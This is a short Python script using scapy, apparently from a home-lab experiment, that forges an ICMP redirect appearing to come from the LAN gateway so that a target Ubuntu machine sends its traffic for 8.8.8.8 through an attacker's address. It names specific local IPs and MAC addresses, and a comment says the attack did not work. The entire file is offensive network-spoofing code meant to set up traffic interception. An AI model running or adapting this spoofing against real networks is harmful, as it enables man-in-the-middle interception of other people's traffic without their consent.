# ip:192.168.1.1, mac:7c:a9:6b:28:1b:80
# ip:192.168.1.2, mac:8a:55:2b:92:3b:7c
# ip:192.168.1.3, mac:36:ae:16:8c:8a:60
# ip:192.168.1.4, mac:90:32:4b:21:66:3f
# THIS DID NOT WORK
# check if redirection is on, in the target linux system using, sysctl -a | grep accept_redirects
from scapy.all import *

ip_gateway = "192.168.1.1"
mac_gateway = "7c:a9:6b:28:1b:80"
ip_target = "192.168.1.2" #ubuntu ==== attack is not working in windows
mac_target = "8a:55:2b:92:3b:7c"
ip_destinationtarget = "8.8.8.8"
ip_attacker = "192.168.1.6"


pkt = Ether()/IP()/ICMP()
pkt["Ethernet"].src = mac_gateway
pkt["Ethernet"].dst = mac_target
pkt["IP"].src = ip_gateway
pkt["IP"].dst = ip_target
pkt["ICMP"].type = 5
pkt["ICMP"].code = 1
pkt["ICMP"].gw = ip_attacker

pkt2 = IP()/UDP()
pkt2["IP"].src = ip_target
pkt2["IP"].dst = ip_destinationtarget
# pkt2["ICMP"].id = 1
# pkt2["ICMP"].seq = 1
# pkt2["TCP"].ack = 1
# pkt2["TCP"].seq = 1
a = pkt/pkt2
a.show()
sendp(pkt/pkt2, iface="wlan0")